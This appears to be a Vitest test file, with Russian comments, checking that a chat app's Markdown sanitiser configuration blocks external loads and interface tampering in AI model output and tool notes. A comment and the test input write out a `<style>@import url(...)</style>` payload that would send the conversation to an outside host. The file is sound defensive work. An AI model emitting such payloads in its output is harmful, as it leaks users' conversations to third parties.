import { beforeEach, describe, expect, it, vi } from 'vitest';

// Безопасность T11: Markdown для текста модели и заметок инструментов ничего не должен загружать сам.
// В среде node нет DOM и jsdom не ставим, поэтому проверяется конфигурация, с которой toSafeHtml вызывает DOMPurify.
// Поведение самого DOMPurify 3.4 (что он оставляет при такой конфигурации) проверено разово на jsdom:
// <style>@import url(...)</style> проходит во всех режимах; без repoUrl и без noImages проходят
// <video poster|src>, <audio src>, <picture><source srcset>, style="background:url()", background у table/td, <input type=image src>.

type Cfg = { FORBID_TAGS?: string[]; FORBID_ATTR?: string[]; [k: string]: unknown };
let lastCfg: Cfg = {};

vi.mock('dompurify', () => ({
  default: {
    sanitize: (dirty: string, cfg: Cfg) => {
      lastCfg = cfg;
      return dirty;
    },
  },
}));

// absolutize разбирает HTML через DOMParser; для проверки конфигурации достаточно заглушки без узлов.
(globalThis as { DOMParser?: unknown }).DOMParser = class {
  parseFromString(html: string) {
    return { querySelectorAll: () => [], body: { innerHTML: html } };
  }
};

const { toSafeHtml } = await import('../src/client/components/Markdown');

const cfgFor = (opts: Parameters<typeof toSafeHtml>[1]): Cfg => {
  lastCfg = {};
  toSafeHtml('текст\n\n<style>@import url(http://127.0.0.1:9/x.css)</style>', opts);
  return lastCfg;
};
const forbidsTag = (c: Cfg, t: string) => (c.FORBID_TAGS ?? []).includes(t);
const forbidsAttr = (c: Cfg, a: string) => (c.FORBID_ATTR ?? []).includes(a);

beforeEach(() => {
  lastCfg = {};
});

describe('T11: ответ модели (noImages) — без внешних загрузок', () => {
  it('тег <style> запрещён: @import url() / background:url() из ответа модели — канал утечки и подмена интерфейса', () => {
    // Дыра: NO_REMOTE.FORBID_TAGS не содержит 'style', а DOMPurify по умолчанию разрешает тег style.
    // Ответ `текст\n\n<style>@import url(https://чужой/?q=<разговор>)</style>` попадает в документ и грузится.
    expect(forbidsTag(cfgFor({ noImages: true }), 'style')).toBe(true);
  });

  it('то же в чате репозитория (repoUrl + noImages)', () => {
    expect(forbidsTag(cfgFor({ repoUrl: 'https://github.com/o/r', branch: 'main', noImages: true }), 'style')).toBe(true);
  });

  it('картинки, медиа, srcset/poster/background и style-атрибут запрещены (регресс-страж)', () => {
    const c = cfgFor({ noImages: true });
    for (const t of ['img', 'picture', 'source', 'video', 'audio', 'image']) expect(forbidsTag(c, t), t).toBe(true);
    for (const a of ['style', 'srcset', 'poster', 'background']) expect(forbidsAttr(c, a), a).toBe(true);
    // <input type=image src> — либо тег input, либо атрибут src должен быть запрещён
    expect(forbidsTag(c, 'input') || forbidsAttr(c, 'src')).toBe(true);
  });
});

describe('T11: заметки инструмента (без repoUrl, без noImages) — без внешних загрузок', () => {
  // ToolPage → <NotesEditor> → <Markdown breaks interactiveTasks> без repoUrl и без noImages.
  // Заметки приходят и из импорта чужого файла, поэтому загрузка по ним — внешний вызов без действия пользователя (инвариант 8).
  const notes = { breaks: true, interactiveTasks: true } as const;

  it('<style> запрещён', () => {
    expect(forbidsTag(cfgFor(notes), 'style')).toBe(true);
  });

  it('<video poster|src>, <audio src>, <picture><source srcset> запрещены', () => {
    const c = cfgFor(notes);
    for (const t of ['picture', 'source', 'video', 'audio']) expect(forbidsTag(c, t), t).toBe(true);
  });

  it('атрибуты style, srcset, poster, background запрещены', () => {
    const c = cfgFor(notes);
    for (const a of ['style', 'srcset', 'poster', 'background']) expect(forbidsAttr(c, a), a).toBe(true);
  });

  it('<input type=image src> не загружается, но чек-боксы задач остаются (src запрещён, input — нет)', () => {
    const c = cfgFor(notes);
    expect(forbidsAttr(c, 'src')).toBe(true);
    expect(forbidsTag(c, 'input')).toBe(false);
  });
});

describe('T11: ветка с repoUrl не ослаблена и не изменена', () => {
  it('README и заметки репозитория: профиль html и те же ADD_ATTR, что до T11 (ничего не разрешено сверх)', () => {
    const c = cfgFor({ repoUrl: 'https://github.com/o/r', branch: 'main' });
    expect(c.USE_PROFILES).toEqual({ html: true });
    expect(c.ADD_ATTR).toEqual(['target', 'align', 'width', 'height']);
    expect(c.ADD_TAGS).toBeUndefined();
    expect(c.ALLOWED_URI_REGEXP).toBeUndefined();
  });
});

describe('T11: три уровня очистки (S10)', () => {
  it('уровень 1: style (тег и атрибут) запрещён везде, включая README', () => {
    const c = cfgFor({ repoUrl: 'https://github.com/o/r', branch: 'main' });
    expect(forbidsTag(c, 'style')).toBe(true);
    expect(forbidsAttr(c, 'style')).toBe(true);
    expect(forbidsTag(c, 'img')).toBe(false); // README картинки показывает
    expect(forbidsAttr(c, 'src')).toBe(false);
  });

  it('уровень 3: текст модели — без форм и имён интерфейса', () => {
    const c = cfgFor({ noImages: true });
    for (const t of ['form', 'input', 'button', 'textarea', 'select']) expect(forbidsTag(c, t), t).toBe(true);
    for (const a of ['id', 'name', 'class', 'popover', 'popovertarget', 'popovertargetaction']) expect(forbidsAttr(c, a), a).toBe(true);
  });

  it('уровень 3 не затрагивает заметки инструмента: class и id остаются', () => {
    const c = cfgFor({ breaks: true });
    expect(forbidsAttr(c, 'class')).toBe(false);
    expect(forbidsTag(c, 'form')).toBe(false);
  });
});
